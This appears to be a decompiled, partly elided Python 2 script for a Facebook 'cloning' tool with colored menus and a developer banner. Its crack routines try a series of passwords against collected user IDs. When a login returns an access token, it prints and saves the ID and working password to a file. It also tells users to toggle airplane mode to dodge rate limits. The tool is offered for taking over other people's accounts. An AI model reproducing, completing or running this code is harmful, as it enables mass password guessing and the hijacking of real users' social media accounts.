...
# Time Succes decompile : 2022-01-31 13:12:28.209130
try:
...
logo = '\x1b[1;91m __  _\n\x1b[1;91m|_|\n\x1b[1;92m|  | |\n\x1b[1;92m| |\ |\n\x1b[1;91m|_| __|\n\x1b[1;93m______________________________________________________\n \n \x1b[1;93m(*)\x1b[1;92m Developer : Muhammad Kashif Baloch \x1b[1;33m\xf0\x9f\x94\xa5BALOCH\xf0\x9f\x94\xa5\n \x1b[1;93m(*)\x1b[1;92m FB  : facebook.com/Mr.Jadugar1\n \x1b[1;93m(*)\x1b[1;92m Tool type : Cloning Tool\n \x1b[1;93m(*)\x1b[1;92m Github    : https://github.com/Kashibaloch754\n\x1b[1;93m______________________________________________________\n'
...
def main():
    ...
    print '\x1b[1;93m[3] \x1b[1;92mContact Owner On YouTube'
    print '\x1b[1;93m[4] \x1b[1;92mLike Our official Fb Page '
...
def main_select():
    ...
    if SYED == '':
        ...
        os.system('xdg-open https://facebook.com/jadugar001')
        main()
    elif SYED == '0':
        os.system('exit')
    else:
...
def login():
    try:
        ...
        print '\x1b[1;93m[2] \x1b[1;92mLogin With EMAIL or Password\n'
...
def crack():
    ...
    print ''
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print '\x1b[1;93m[1] \x1b[1;92mPUBLIC ID CLONING     \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;93m[2] \x1b[1;92mCLONE IDZ FROM FOLLOWERS  \x1b[1;91m[ Crack 3 links ]\n'
...
def crack_select():
    ...
    print 54 * '_'
    print ''
    print '[\x1b[1;97m\x1b[1;41m For Speedup Cloning Turn On Airplane mode 5 To 10 Second \x1b[0m\x1b[1;93m]'
    print 54 * '\x1b[1;93m_'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;93m[KASHIF] ' + uid + ' | ' + pass1 + ' | ' + name
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;93m[KASHIF] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Syedcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;93m[KASHIF] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Syedcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[1;93m[KASHIF] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Syedcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'access_token' in q:
                                ...
                                print '\x1b[1;93m[KASHIF] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('Syedcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'access_token' in q:
                                    ...
                                    print '\x1b[1;93m[KASHIF] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('Syedcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        print '\x1b[1;93m[KASHIF] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('Syedcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
...
def choice():
    ...
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print '\x1b[1;93m[1] \x1b[1;92mPUBLIC ID CLONING     \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;93m[2] \x1b[1;92mCLONING FROM FOLLOWERS  \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;93m[0] \x1b[1;92mBACK'
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print ''
    choice_select()
...
def choice_select():
    ...
    print ' \x1b[1;93mTotal IDs :\x1b[1;92m ' + str(len(id))
    print ' \x1b[1;93mThe process has been Started'
    print ' \x1b[1;93mAb wait kro idz ajayegi'
    print ' \x1b[1;93mPress ctrl + z to stop'
    print 54 * '_'
    print ''
    print '[\x1b[1;97m\x1b[1;41m For Speedup Cloning Turn On Airplane mode 5 to 10 Second \x1b[0m\x1b[1;93m]'
